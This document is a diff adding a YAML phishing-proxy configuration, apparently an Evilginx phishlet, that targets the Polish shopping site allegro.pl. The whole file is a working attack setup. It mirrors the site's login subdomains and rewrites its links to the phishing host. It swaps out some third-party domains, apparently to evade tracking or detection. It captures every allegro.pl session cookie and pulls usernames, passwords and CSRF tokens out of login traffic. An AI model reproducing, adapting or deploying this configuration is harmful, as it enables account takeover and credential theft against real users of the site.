@@ -1,0 +1,38 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'allegro.pl', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'edge', orig_sub: 'edge', domain: 'allegro.pl', session: true, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'www.allegro.pl', orig_sub: 'www', domain: 'allegro.pl', search: 'www.allegro.pl', replace: 'www.{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.allegro.pl', orig_sub: 'www', domain: 'allegro.pl', search: 'edge.allegro.pl', replace: 'edge.{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.allegro.pl', orig_sub: 'www', domain: 'allegro.pl', search: 'bing.com', replace: 'asasdasdasdjustranom.com', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www.allegro.pl', orig_sub: 'www', domain: 'allegro.pl', search: 'tda.io', replace: 'adasdasdasdasdasdasdqwepoa.com', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'edge.allegro.pl', orig_sub: 'edge', domain: 'allegro.pl', search: 'www.allegro.pl', replace: 'www.{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'edge.allegro.pl', orig_sub: 'edge', domain: 'allegro.pl', search: 'edge.allegro.pl', replace: 'edge.{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'edge.allegro.pl', orig_sub: 'edge', domain: 'allegro.pl', search: 'bing.com', replace: 'asasdasdasdjustranom.com', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'edge.allegro.pl', orig_sub: 'edge', domain: 'allegro.pl', search: 'tda.io', replace: 'adasdasdasdasdasdasdqwepoa.com', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+auth_tokens:
+  - domain: '.allegro.pl'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/moje-allegro/moje-konto'
+  
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    - key: '_csrf'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'www.allegro.pl'
+  path: '/login/form/'
